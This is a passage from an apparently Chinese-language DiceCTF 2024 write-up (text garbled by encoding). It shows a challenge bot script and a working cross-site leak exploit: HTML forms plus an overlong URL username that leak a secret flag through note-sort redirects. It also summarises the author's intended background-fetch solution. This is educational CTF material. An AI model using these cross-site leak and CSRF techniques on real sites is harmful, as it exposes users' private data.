punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token constant">FLAG</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">waitForNavigation</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">"networkidle2"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// restart browser, which should close all windows</span>        <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        browser <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">launchBrowser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// go to the submitted site</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">7500</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">"networkidle2"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token comment">// restart browser, which should close all windows</span>        <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        browser <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">launchBrowser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// check on notes now that all other windows are closed</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token string">"http://localhost:3000"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">7500</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">"networkidle2"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"form[action='/view']"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">waitForNavigation</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">"networkidle2"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        browser <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>browser<span class="token punctuation">)</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨è¨ªå•å®Œæˆ‘å€‘æä¾›çš„ URL ä»¥å¾Œï¼Œbot æ‰å»è¨ªå• <code>/view</code> é é¢ï¼Œå› æ­¤é€™æ¬¡æˆ‘å€‘æ²’è¾¦æ³•å¾ç€è¦½å™¨ä¸Šé¢å»è¡¡é‡æ™‚é–“ï¼Œè€Œæ˜¯è¦å¾è‡ªå·± local å»æ¸¬é‡ã€‚å¦‚æœå‰é¢è¬›çš„æƒ³æ³•æ²’éŒ¯ï¼Œç…§ç†ä¾†èªªåœ¨æˆ‘å€‘ local ä¹Ÿå¯ä»¥æ¸¬é‡å‡ºæ™‚é–“ï¼Œserver response time æœƒè®Šæ…¢ã€‚</p><p>ä½†å˜—è©¦äº†å¤§æ¦‚ä¸‰å››å€‹å°æ™‚ä»¥å¾Œï¼Œç™¼ç¾è¡Œä¸é€šã€‚</p><p>ç†ç”±å¤§æ¦‚æœ‰å…©é»ï¼Œç¬¬ä¸€é»æ˜¯ server çš„è™•ç†é€Ÿåº¦å¤ªå¿«ï¼Œæˆ‘æ¸¬äº†ä¸€ä¸‹ç™¼é€ 500 å€‹è«‹æ±‚çµ¦ localhostï¼Œå¤§æ¦‚ 400ms å°±è™•ç†å®Œäº†ï¼Œç¬¬äºŒé»æ˜¯æ™‚é–“å€é–“å¾ˆé›£æŠ“ï¼Œå¾ˆé›£æŒæ¡åˆ°ã€Œbot è¨ªå• &#x2F;viewã€çš„é‚£æ®µæ™‚é–“ã€‚</p><p>ç¸½ä¹‹å‘¢ï¼Œè©¦äº†å¾ˆä¹…éƒ½æ²’è¾¦æ³•å¾—åˆ°ä¸€å€‹ç©©å®šçš„è¾¦æ³•ï¼Œåªå¥½å…ˆæ”¾æ£„äº†ã€‚</p><p>è€Œæ­¤æ™‚æˆ‘æŠŠæ³¨æ„åŠ›è½‰ç§»åˆ°äº†æ–°å¢ note æ™‚çš„é€™ä¸€æ®µï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> newLen <span class="token operator">=</span> totalLen <span class="token operator">+</span> text<span class="token punctuation">.</span>length<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>newLen <span class="token operator">></span> <span class="token number">16384</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// case 1</span>    <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/?message=Cannot add, please delete some notes first (</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>newLen<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> > 16384 chars)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>userNotes<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>userNotes<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>notes<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>id<span class="token punctuation">,</span> userNotes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// case2</span>reply<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/?message=Note added successfully"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœç­†è¨˜é•·åº¦è¶…å‡º 16384ï¼Œæœƒé‡æ–°å°å‘åˆ° <code>/?message=Cannot add, please delete some notes first</code>ï¼Œåä¹‹å‰‡å°å‘è‡³ <code>/?message=Note added successfully</code>ï¼Œæ›è¨€ä¹‹ï¼Œå¦‚æœå¯ä»¥åµæ¸¬å‡ºå°å‘åˆ°çš„æ˜¯å“ªä¸€å€‹ï¼Œä¸€æ¨£å¯ä»¥åˆ©ç”¨é¡ä¼¼çš„æ‰‹æ³• leak å‡º flagã€‚</p><p>æˆ‘æœ‰å€‹æƒ³æ³•æ˜¯çŒœæ¸¬ç€è¦½å™¨å°æ–¼ç¶²å€é•·åº¦æ‡‰è©²æœƒæœ‰é™åˆ¶ï¼Œå¯ä»¥è©¦è‘—æ§‹é€ å‡ºä¸€å€‹è¶…é•·çš„ç¶²å€ï¼Œå°å‘åˆ° <code>/?message=Cannot add, please delete some notes first</code> æ™‚æœƒè¶…éé™åˆ¶ï¼Œè€Œå°å‘åˆ° <code>/?message=Note added successfully</code> æ™‚å‰‡ä¸æœƒã€‚</p><p>ä½†å•é¡Œæ˜¯é€™é‚Šæˆ‘å€‘æ²’è¾¦æ³•æ§åˆ¶ path çš„é•·åº¦ï¼Œé‚£è©²æ€éº¼è®“ç¶²å€è®Šé•·ï¼Ÿ</p><p>æˆ‘è©¦äº†ä¸€ä¸‹ usernameï¼Œä¾‹å¦‚èªªï¼š<code>http://$&#123;&#39;a&#39;.repeat(1000000)&#125;&#125;:pwd@localhost:3000</code>ï¼Œç™¼ç¾å±…ç„¶æˆåŠŸäº†ï¼</p><p>ç´°ç¯€å¯ä»¥çœ‹åº•ä¸‹é€™å€‹ PoCï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span>  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>winForm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>inp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/hang'</span><span class="token punctuation">)</span>    win <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'about:blank'</span><span class="token punctuation">,</span> <span class="token string">'winForm'</span><span class="token punctuation">)</span>    <span class="token keyword">const</span> <span class="token constant">TARGET</span> <span class="token operator">=</span> <span class="token string">'http://'</span><span class="token operator">+</span> <span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">2097050</span><span class="token punctuation">)</span>  <span class="token operator">+</span> <span class="token string">':def@localhost:3000'</span>    f<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token constant">TARGET</span> <span class="token operator">+</span> <span class="token string">'/create'</span>    inp<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token number">0</span>    <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/timeout'</span><span class="token operator">+</span>count<span class="token punctuation">)</span>      count<span class="token operator">++</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> r <span class="token operator">=</span> win<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/?r='</span> <span class="token operator">+</span> r<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/err'</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span>        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç•¶æˆ‘å»ºç«‹é•·åº¦åªæœ‰ 2 çš„ note æ™‚ï¼Œç¶²å€åœ¨é™åˆ¶ä¹‹å…§ï¼Œå› æ­¤æ­£å¸¸é–‹å•Ÿæ–°çš„é é¢ï¼Œå»æ‹¿ <code>win.location.href</code> æœƒè§¸ç™¼ cross-origin çš„éŒ¯èª¤ã€‚</p><p><img src="/img/dicectf-2024-writeup/p1.png" alt="p1"></p><p>ä½†å¦‚æœæ˜¯å»ºç«‹é•·åº¦ 20000 çš„ note æ™‚ï¼Œé‡æ–°å°å‘çš„é é¢ç¶²å€å¤ªé•·ï¼Œæ‰€ä»¥è§¸ç™¼éŒ¯èª¤ï¼Œå°è‡´æ–°é–‹çš„é é¢è®Šæˆäº† <code>about:blank</code>ï¼Œä¸æœƒè§¸ç™¼éŒ¯èª¤ã€‚</p><p><img src="/img/dicectf-2024-writeup/p2.png" alt="p2"></p><p>å› æ­¤ï¼Œç¢ºå¯¦å¯ä»¥é è‘—ç¶²å€é•·åº¦é€™ä¸€é»ï¼Œå¾—çŸ¥ note åˆ°åº•æœ‰æ²’æœ‰å»ºç«‹æˆåŠŸã€‚</p><p>æœ€å¾Œçš„ exploit å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span>  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>winForm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>inp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f_delete</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:3000/remove<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f_create</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:3000/create<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>inp2</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/hang'</span><span class="token punctuation">)</span>    win <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'about:blank'</span><span class="token punctuation">,</span> <span class="token string">'winForm'</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token string">'http://'</span><span class="token operator">+</span> <span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">2097050</span><span class="token punctuation">)</span>  <span class="token operator">+</span> <span class="token string">':def@localhost:3000'</span> <span class="token operator">+</span> <span class="token string">'/create'</span>    <span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token number">0</span>    <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/ping_'</span> <span class="token operator">+</span> count<span class="token punctuation">)</span>      count<span class="token operator">++</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>    <span class="token comment">// abcdefghijklmnopqrstuvwxyz</span>    <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// step1. create note</span>      <span class="token keyword">let</span> testPayload <span class="token operator">=</span> <span class="token string">'dice&#123;xs'</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/step_1_start'</span><span class="token punctuation">)</span>      inp2<span class="token punctuation">.</span>value <span class="token operator">=</span> testPayload <span class="token operator">+</span> <span class="token string">'z'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span>      f_create<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/step_1_end'</span><span class="token punctuation">)</span>      <span class="token comment">// step2. delete first note</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/step_2_start'</span><span class="token punctuation">)</span>      f_delete<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/step_2_end'</span><span class="token punctuation">)</span>      <span class="token comment">// step3. leak</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/step_3_start'</span><span class="token punctuation">)</span>      inp<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span>      f<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/step_3_end'</span><span class="token punctuation">)</span>      <span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token number">0</span>      <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/timeout'</span><span class="token operator">+</span>count<span class="token punctuation">)</span>        count<span class="token operator">++</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> r <span class="token operator">=</span> win<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href          <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/?r='</span> <span class="token operator">+</span> r<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/err'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// err: payload is before flag</span>        <span class="token comment">// dice&#123;azzz</span>        <span class="token comment">// dice&#123;flag&#125;</span>        <span class="token comment">// about:blank, payload is after flag</span>        <span class="token comment">// dice&#123;flag&#125;</span>        <span class="token comment">// dice&#123;fzzzz&#125;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¯ submit ä¸€æ¬¡ï¼Œå°±èƒ½çŸ¥é“ flag çš„é †åºåœ¨æŸå€‹å­—å…ƒå‰é¢é‚„å¾Œé¢ï¼Œé‹ç”¨ binary search çš„è©±ï¼Œå¤§ç´„ submit 6 æ¬¡å¯ä»¥çŸ¥é“çµæœï¼Œä¸€æ¬¡è¦ç­‰ 30 ç§’ï¼Œç¸½å…±éœ€è¦ 3 åˆ†é˜ï¼Œå› ç‚ºæ‡¶å¾—è‡ªå‹•åŒ–æ‰€ä»¥æˆ‘å°±æ‰‹å‹•æ…¢æ…¢ leak äº†ã€‚</p><p>å¤§æ¦‚èŠ±äº† 40 åˆ†é˜å·¦å³æ‹¿åˆ° flagï¼Œä¸éé€™å…¶å¯¦æ˜¯ unintended å°±æ˜¯äº†ã€‚</p><h3><span id="é æœŸè§£">é æœŸè§£</span></h3><p>ç­†è¨˜ä¸€ä¸‹ strellic åœ¨ Discord è£¡é¢è²¼çš„é æœŸè§£æ³•ï¼Œç”¨åˆ°äº† background fetch APIï¼š</p><ol><li>install service worker and use background fetch api</li><li>this essentially causes the browser to make a download, but this download is special since it resumes on browser start</li><li>lax + post csrf a lot of img tags to purify.js, with a prefix that gets sorted against the flag (see safelist writeup for more details)</li><li>delete the first post</li><li>if your post was sorted first, it would be deleted</li><li>if it was sorted last, it would not be deleted</li><li>when the browser bot checks &#x2F;view, the browser will take longer to load the page if there are a lot of img tags</li><li>if it takes longer to load the page, the browser lasts longer and closes later</li><li>when it closes, the background fetch download stops</li><li>so, by timing how long your background fetch stays connected to your server, you can leak the outcome of the sort, and the flag</li></ol><h2><span id="webx2fburnbin-1-solve">web&#x2F;burnbin (1 solve)</span></h2><p>å…ˆè¬›ä¸€ä¸‹ï¼Œé€™é¡Œæˆ‘æ²’è§£é–‹ä¹Ÿæ²’æ™‚é–“çœ‹ï¼Œåº•ä¸‹æ˜¯åƒè€ƒä½œè€…çš„è§£ç­”å¯«çš„ã€‚</p><p>é€™é¡Œçš„é¡å‹ä¹Ÿæ˜¯é¡ä¼¼æ–¼ç¶“å…¸çš„ note appï¼Œå¯ä»¥è¨»å†Šä¸€å€‹æ–°çš„å¸³è™Ÿä¸¦ä¸”å»ºç«‹ noteï¼Œå»ºç«‹çš„æ™‚å€™å¯ä»¥ä¸Šå‚³ä¸€å¼µåœ–ç‰‡ã€‚</p><p>å…ˆä¾†çœ‹ä¸€ä¸‹ bot çš„éƒ¨åˆ†ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> puppeteer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"puppeteer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"crypto"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">ms</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token 